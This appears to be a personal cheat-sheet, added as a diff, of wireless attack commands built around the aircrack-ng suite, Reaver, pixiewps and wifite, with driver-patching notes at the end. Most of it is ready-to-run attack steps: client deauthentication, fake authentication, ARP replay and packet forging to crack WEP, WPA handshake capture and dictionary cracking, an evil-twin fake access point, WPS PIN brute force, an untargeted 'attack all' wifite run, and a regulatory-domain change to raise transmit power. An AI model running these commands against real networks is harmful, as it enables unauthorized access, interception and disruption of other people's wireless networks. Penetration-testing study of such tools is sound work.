@@ -1,0 +1,354 @@
+AIRCRACK-NG SUITE
+
+aircrack-ng authentication.pcap
+	-dump wep/wpa(2-psk) credentials from pcap/pcap-ng file
+
+
+AIRMON-NG
+airmon-ng
+	-display interface driver status
+airmon-ng start wlan0
+	-start monitor mode on wlan0
+airmon-ng check
+	-check processes stopping airmon-ng from running
+airmon-ng check kill
+EXAMPLE
+ifconfig wlan0 down
+airmon-ng start wlan0
+ifconfig wlan0mon up
+
+	
+AIRODUMP-NG
+airodump-ng
+	-capture raw 802.11 frames, will display a list of APs & connected clients
+	--suitable for collecting WEP IVs for use with aircrack-ng
+airodump-ng -i wlan0mon -W -M
+airodump-ng -c 8 --bssid 00:14:6C:7A:41:20 -w capture wlan0mon
+	-limit captures to a single bssid mac address
+	--add option --ivs after -w capture to only store initializations vectors (not full packets), saving disc space
+
+	
+AIREPLAY-NG
+ Attack 0: Deauthentication
+	aireplay-ng -0 1 -a 00:14:6C:7E:40:80 -c 00:0F:B5:34:30:30 wlan0mon
+ Attack 1: Fake authentication (WEP)
+	-perform the two types of WEP authentication (Open System and Shared Key) and to associate with an AP
+	--useful when there are no associated clients
+	aireplay-ng -1 0 -e target -a 00:14:6C:7E:40:80 -h 00:09:5B:EC:EE:F2 -y sharedkeyxor wlan0mon
+ Attack 2: Interactive packet replay (WEP)
+	-choose a specific packet for replaying (injecting)
+	--have to select a packet which will “naturally” be successful in IV generation, or manipulate a captured packet into a “natural” one
+	aireplay-ng -2 -b 00:14:6C:7E:40:80 -d FF:FF:FF:FF:FF:FF -t 1 wlan0mon
+		-basic packet replay
+	aireplay-ng -2 -b 00:14:6C:7E:40:80 -t 1 -c FF:FF:FF:FF:FF:FF -p 0841 wlan0mon
+		-modified packet replay
+			-b 00:14:6C:7E:40:80 - selects packets with the MAC of the AP we are interested in
+			-t 1 - selects packets with the “To Distribution System” flag set on
+			-c FF:FF:FF:FF:FF:FF - sets the destination MAC address to be a broadcast. This is required to cause the AP to replay the packet and thus generating new IVs.
+			-p 0841 - sets the Frame Control Field in such a way that the packet looks like it‟s being sent from a wireless client.
+			--Setting -v 8 -u 0 -w 0 allows you to send beacons frames
+			--Setting -v 12 -u 1 -w 0 -m 10 -n 2000 sets a filter for control frames (in this case clear-to-send frames)
+ Attack 3: ARP request replay attack
+	-listens for an ARP packet then retransmits it back to the AP, causing the AP to repeat the ARP packet with a new IV
+	-program retransmits the same ARP packet over and over, each ARP packet repeated by the AP has a new IV
+	--most effective way to generate new initialization vectors. This attack is probably the most reliable of all
+	aireplay-ng -3 -b 00:13:10:30:24:9C -h 00:11:22:33:44:55 wlan0mon
+		-- -h 00:11:22:33:44:55 is the source MAC address (either an associated client or from fake authentication)
+	aireplay-ng -2 -r replay_arp-0219-115508.cap wlan0mon
+		-replay a previous arp replay as a special case of interactive packet replay attack
+		--need either the MAC address of an associated client , or a fake MAC from attack 1. The simplest and easiest way is to utilize the MAC address of an associated client. This can be obtained via Airodump-ng.
+		--will fail if there is not traffic on the network
+	--To speed up ARP traffic generation, you can ping a nonexistent IP on your network (from the victim computer)
+ Attack 4: KoreK chopchop attack
+	--can decrypt a WEP data packet without knowing the key. It can even work against dynamic WEP
+	--This attack does not recover the WEP key itself, it merely reveals the plaintext
+	--Some APs are not vulnerable to this attack. They may seem vulnerable at first but actually drop data packets shorter than 60 bytes.
+	aireplay-ng -4 -h 00:09:5B:EC:EE:F2 -b 00:14:6C:7E:40:80 wlan0mon
+		-- -m && -n for min/max packet sizes
+		-file “replay_dec-0201-191706.xor” can then be used to generate a packet with Packetforge-ng (such as an ARP packet)
+			--You may also use tcpdump or Wireshark to view the decrypted packet which is stored in that file
+	FULL ATTACK
+		1. try: aireplay-ng -4 wlan0mon
+		   else: aireplay-ng -4 -h 00:09:5B:EB:C5:2B wlan0mon
+		2. packetforge-ng -0 -a $AP -h $ATH -k 192.168.1.100 -l 192.168.1.2 -y replay_dec-0627-022301.xor -w arp.cap
+		3. aireplay-ng -2 -r arp.cap wlan0mon
+	--May work where fragmentation does not, but cannot be used against every AP
+ Attack 5: Fragmentation attack
+	-fragmentation attack does not recover the WEP key itself, but (also) obtains the PRGA (pseudo random generation algorithm) of the packet. The PRGA can then be used to generate packets with Packetforge-ng which are in turn are used for various injection attacks
+	--requires at least one data packet to be received from the AP in order to initiate the attack
+	aireplay-ng -5 -b 00:14:6C:7E:40:80 -h 00:0F:B5:AB:CB:9D wlan0mon
+		-should have have successfully obtained the PRGA which is stored in the file named by the program, use Packetforge-ng to generate one or more packets to be used for various injection attacks
+	--source MAC address used in the attack must be associated with the AP. To do this, you can use fake authentication or use a MAC address of an existing wireless client
+	--fragmentation attack sends out a large number of packets that must all be received by the AP for the attack to be successful. If any of the packets get lost then the attack fails. 
+		--must a have a good quality connection plus be reasonably close to the AP.
+ Attack 9: Injection test
+	-test determines if your card can successfully inject wireless packets, and measures ping response times to APs
+	aireplay-ng -9 wlan0mon
+		-general injection test technique
+	aireplay-ng -9 -e target -a 00:14:6C:7E:40:80 -i wlan1 wlan0mon
+		-injection test attack using two cards to determine which attacks your card can run
+
+
+PACKETFORGE-NG
+	-To create an encrypted packet with Packetforge, you must have a PRGA (pseudo random generation algorithm) file which you have previously obtained from the EWP enabled network.
+	--The PRGA is used to encrypt the packet you create.
+	-A PGRA file can typically be obtained from Aireplay-ng, chopchop or fragmentation attacks.
+packetforge-ng <mode> <options>
+	MODES
+ --arp : forge an ARP packet (-0)
+	packetforge-ng -0 -a 00:14:6C:7E:40:80 -h 00:0F:B5:AB:CB:9D -k 192.168.1.100 -l 192.168.1.1 -y fragment-0124-161129.xor -w arp-request
+		--chop-chop attack
+		-test with: airdecap-ng -w <AP encryption key> arp-request
+		-view decrypted packet(if successful): tcpdump -n -vvv -e -s0 -r arp-request-dec
+		-then replay: aireplay-ng -2 -r arp-request wlan0mon
+ --udp : forge an UDP packet (-1)
+ --icmp : forge an ICMP packet (-2)
+ --null : build a null packet (-3)
+	-smallest possible packets which contain no data. The “-s” switch is used to manually set the size of the packet.
+	--This a simple way to generate small packets for injection.
+	packetforge-ng --null -s 42 -a BSSID -h SMAC -w short-packet.cap -y fragment.xor
+	packetforge-ng -0 -a 00:14:6C:7E:40:80 -h 00:0F:B5:AB:CB:9D -k 192.168.1.100 -l 192.168.1.1 -y fragment-0124-161129.xor -w arp
+ --custom : build a custom packet (-9)
+
+
+AIRCRACK-NG
+WEP
+	aircrack-ng file.pcap
+	-recover the WEP key from a capture dump once enough encrypted packets have been captured with Airodump-ng
+	methods used:
+		PTW approach
+			--requires few packets to crack WEP key
+		FMS/KoreK method
+			--incorperates statistical attacks with brute force to discover WP KEY
+			--certain IVs "leak" WEP key for particular bytes
+		Dictionary attack
+			--only good methods for WPA/WPA PSK
+		aircrack-ng [options] <capture file(s)>
+			-a force mode: 1=static WEP, 2=WPA/WPA2-PSK
+			-p number of cpus to use
+			-c restrict search space to alnum chars (0x20-0x7F)
+			-t restrict search space to binary coded decimal hex chars
+			-h restrict search space to numerica chars (0x30-0x39)
+			-m MAC address to filter WEP data packets
+			-n length of key 64 for 40-bit WEP, 128 for 104-bit WEP, &c
+			-f fudge --higher value increases time, but also success %
+			-k 17 statistcal attacks used, disable individually if false positives found
+			-w path/to/wordlist
+			-x crack the last 2 keybytes by brute force rather than default:1
+			-Z invoke PTW cracking method
+		aircrack-ng -w ascii.txt -a 1 -n 64 -e target wep10-01.cap
+			--example dictionary attack
+		aircrack-ng -w dict1.txt,dict2.txt -a 1 -n 64 -e target *.pcap
+			-multiple dict attack
+		aircrack-ng -z file.pcap
+WPA/WPA2-PSK
+	-only crackable by brute force
+		
+AIRDECAP-NG
+	-decrypt WEP/WPA/WPA2 capture files, given the correct key
+airdecap-ng [options] <pcap file>
+airdecap-ng -b 00:09:5B:10:BC:5A open-network.cap
+
+
+AIRDECLOACK-NG
+
+
+AIRTUN-NG
+	-virtual tunnel interface creator
+		uses:
+		1. Allow all encrypted traffic to be monitored for wireless Intrusion Detection System
+		2. Inject arbitrary traffic into a network
+	--allows use of any tool to create, inject or sniff packets
+airtun-ng <options> <replay interface>
+airtun-ng -a 00:14:6C:7E:40:80 -w 1234567890 wlan0mon
+	-a MAC addr of monitored AP
+	-w encryption key
+ifconfig ath0
+	-must bring up tunnel interface
+ifconfig ath0 192.168.1.83 netmask 255.255.255.0 up
+	--airtun-ng can connect to multiple aps simultaneously
+airodump-ng -c 1,11 ath0
+	--if the different aps broadcast on different channels (channel-switching mode)
+airtun-ng -a 00:14:6C:7E:40:80 --repeat --bssid 00:14:6C:7E:40:80 -i ath0 wlan0
+	--repeate <-repeater function
+	-a mac of ap connected at input(here ath0) interface
+	-i input interface
+airtun-ng -a 00:14:6C:7E:40:80 -r ath0one-01.cap ath0
+	-packet replay (from capture)
+	
+	
+WESSIDE-NG
+EASSIDE-NG
+BUDDY-NG
+	-fuck all these WEP attacks
+	
+AIROLIB-NG
+	-PTK from PMK computation algorithm/tool
+	-objective of airolib-ng operations are to increase speed of aircrack-ng operations (for WPA[2-PSK]) brute force attacks in the spirit of precomputation
+airolib <database> <operation> [options]
+	database - is name of the database file. Optionally specify the full path.
+	operation - specifies the action you would like taken on the database. See below for a complete list.
+	options
+		--init initialize now db file
+		--batch batch-processing all combinations of ESSIDs and passwords
+		--clean <-clear invalid essids/pwords
+		--stats
+		--verify all
+		--import ascii {essid|passwd} {file} -Import a plaintext flat file as a list of either ESSIDs or passwords
+airolib-ng testdb init
+airolib-ng testdb stats
+airolib-ng testdb clean
+airolib-ng testdb clean all
+airolib-ng testdb batch
+airolib-ng testdb verify
+airolib-ng testdb verify all
+airolib-ng testdb import ascii essid ssidlist.txt
+airolib-ng testdb import ascii passwd password.lst
+aircrack-ng -r testdb wpa2.eapol.cap
+		
+		
+John + aircrack
+john --stdout --wordlist=specialrules.lst --rules aircrack-ng -e test -a 2 -w - /root/capture/wpa.cap
+	--attack a pcap file with custom rules and wordlist
+
+	
+AIRSERV-NG
+	-wireless card server which allows multiple wireless application programs to independently use a wireless card via a client-server TCP network connection
+airserv-ng <opts>
+	-p TCP port to listen on (Default:666)
+	-d wifi device to server
+	-c channel to start on
+airserv-ng -d ath0
+	e.g. allows airodump-ng 127.0.0.1:666 to scan all networks
+		--airodump-ng -c 6 192.168.0.1:666 <- also forwards remote interface
+
+	
+capture the WPA/WPA2 authentication handshake and then use aircrack-ng to crack the pre-shared key
+	Start the wireless interface in monitor mode on the specific AP channel
+ifconfig wlan0 down
+airmon-ng start wlan0
+ifconfig wlan0 up
+	Start airodump-ng on AP channel with filter for bssid to collect authentication handshakevvvvvvvvvvvvvvv
+airodump-ng -c 9 --bssid 00:14:6C:7E:40:80 -w psk wlan0mon
+	Use aireplay-ng to deauthenticate the wireless client
+aireplay-ng -0 1 -a 00:14:6C:7E:40:80 -c 00:0F:B5:FD:FB:C2 ath0
+	Run aircrack-ng to crack the pre-shared key using the authentication handshake
+aircrack-ng -w password.lst -b 00:14:6C:7E:40:80 psk*.cap
+	
+
+Fake-AP (Evil Twin) Attack
+airmon-ng start wlan0
+airodump-ng wlan0mon
+airbase-ng -a 00:09:5B:6F:64:1E --essid "TargetAP" -c 11 wlan0mon
+aireplay-ng --deauth 0 -a 00:09:5B:6F:1E
+
+SET tx-power to 30
+ifconfig wlan0 down
+iw reg set BO
+iwconfig wlan0 txpower 30
+ifconfig wlan0 up
+
+Reaver Usage:
+airmon-ng start wlp3s0
+wash -i wlp3s0mon
+	--reaver AP exploration tool
+reaver -i wlp3s0mon -b 11:22:33:44:55:66 -vvv
+	-default brute-force attack on the WPS pin. However, newer access points will lock WPS after a number of attempts. So instead of a pin brute-force, we can try a pixie dust attack which is shorter
+reaver -i wlan0mon -b 11:22:33:44:55:66 -vv -w -n -S -c 1
+	--beter brute force
+reaver -i wlp3s0mon -b 11:22:33:44:55:66 -vvv -K 1
+	-pixie dust attack on target AP using reaver
+reaver -i wlan0mon -b 11:22:33:44:55:66 -a -vv -w  -K 1 -n -S -c 6
+	--improved
+
+
+PIXIEWPS
+pixiewps -e PKE -s E-Hash1 -z E-Hash2 -a AuthKey -n E-Nonce -S
+	--try wash -i wlan0mon -g -c 6 to check if AP is locked out before switching to pixie attack
+
+	
+WIFITE
+wifite --all -i wlan0 --mac --tx=30 --showb --crack --dict=/usr/share/wordlists/rockyou.txt  --strip
+	--attack all the access points, untargeted, unconfigured (interface, mac)
+wifite -b 11:22:33:44:55:66 --mon-iface wlan0mon --nodeauth  --crack --dict=/usr/share/wordlists/rockyou.txt --aircrack --strip --quiet
+	--target access point brute force using preconfigured mon0
+wifite --cracked
+	show cracked APs
+wifite --check capfile.pcap
+	check capfile for handshakes
+	
+		
+TROUBLESHOOTING
+	--Are you physically close enough to send and receive AP packets. Remember that just because you can receive packets from the AP does not mean you will be able to transmit packets to the AP. The wireless card strength is typically less than the AP strength.
+	--biggest reason --> In order for an AP to accept a packet, the source MAC address must already be associated. If the source MAC address you are injecting is not associated then the AP ignores the packet and sends out a “DeAuthentication” packet.
+		--troubleshoot with “tcpdump -n -e -s0 -vvv -i wlan0mon"
+		--to associate with an AP: aireplay-ng -1 0 -e <SSID> -a <BSSID MAC address> -h <source MAC address> wlan0mon
+	--With some drivers, the wireless card MAC address must be the same as MAC address you are injecting; if fake authentication is still not working then try changing the card MAC to the same one you are trying to authenticate with.
+		--macchanger -m XX:XX:XX:XX:XX:XX
+	--Some APs are configured to only allow selected MAC access to associate and connect. If this is the case, you will not be able to successfully do fake authentication unless you know one of the MAC addresses on the allowed list.
+		--tcpdump -n -vvv -s0 -e -i wlan0mon | grep -E "(RA:00:c0:ca:17:db:6a|Authentication|ssoc)"
+	--fake authentication: the exchange should look identical to the “wep.open.system.authentication.cap” file which comes with the Aircrack-ng software
+		--tcpdump -n -e -vvv -r wep.open.system.authentication.cap
+		--aireplay-ng -2 -a <BSSID MAC address> -d FF:FF:FF:FF:FF:FF -m 68 -n 68 -t 1 -f 0 wlan0mon
+		--two authentication packets and then two association packets. If your real life capture does not contain all four packets and your fake authentication is failing then there is a MAC filter in place.
+		--alternate approach is to replay packets from a wireless client which is currently associated with the AP
+		--Use the interactive replay attack instead.
+	--Some APs have a setting to disable wireless client to wireless client communication (called at least on Linksys “AP isolation”). If this is enabled then all the techniques above will not work.
+	AIRSERV-NG
+		-test that airserv-ng is listening on the correct port
+			--netstat -na
+			--lsof -i
+
+connect to wireless:
+ifconfig wlan0 up
+iwlist wlan0 scan
+iwconfig wlan0 essid <ssid> key <passphrase>
+dhclient wlan0
+
+connect to wireless automatically:
+		--append to /etc/network/interfaces
+auto wlan0
+iface wlan0 inet dhcp 
+                wpa-ssid <ssid>
+                wpa-psk  <password>
+
+				
+connect to wireless (nmcli)
+nmcli dev wifi0 connect <ssid> password <passphrase>
+		--reconnect if connection was previously established
+nmcli con up <ssid>
+		--troubleshoot reconnect fails with
+nmcli con up id <ssid>
+
+
+	
+::DRIVERS::
+MADWIFI-NG
+installation:
+	git clone https://github.com/proski/madwifi.git
+	cd madwifi
+	wget http://patches.aircrack-ng.org/madwifi-ng-r4073.patch
+	patch -N -p 1 -i madwifi-ng-r4073.patch
+	./scripts/madwifi-unload
+	make
+	make install
+	## may also need link the System.map if you get that error during make install
+	ln -s /boot/System.map-3.18.0-kali3-586 /usr/src/linux-headers-3.18.0-kali3-586/System.map
+patching Backport drivers for wireless injection
+	wget https://www.kernel.org/pub/linux/kernel/projects/backports/stable/v4.4.2/backports-4.4.2-1.tar.gz
+	tar -zxvf backports-4.4.2-1.tar.gz
+	cd backports-4.4.2-1
+	wget http://patches.aircrack-ng.org/mac80211.compat08082009.wl_frag+ack_v1.patch
+	wget http://patches.aircrack-ng.org/mac80211-2.6.29-fix-tx-ctl-no-ack-retry-count.patch
+	patch -p1 < mac80211.compat08082009.wl_frag+ack_v1.patch
+	patch -p1 < mac80211-2.6.29-fix-tx-ctl-no-ack-retry-count.patch
+	sudo make defconfig-wifi
+	sudo make
+	sudo make install
+On Kali
+	apt-get install firmware-atheros
+	apt-get install firmware-realtek
+	
+	
+REFERENCES:
+https://www.aircrack-ng.org/doku.php
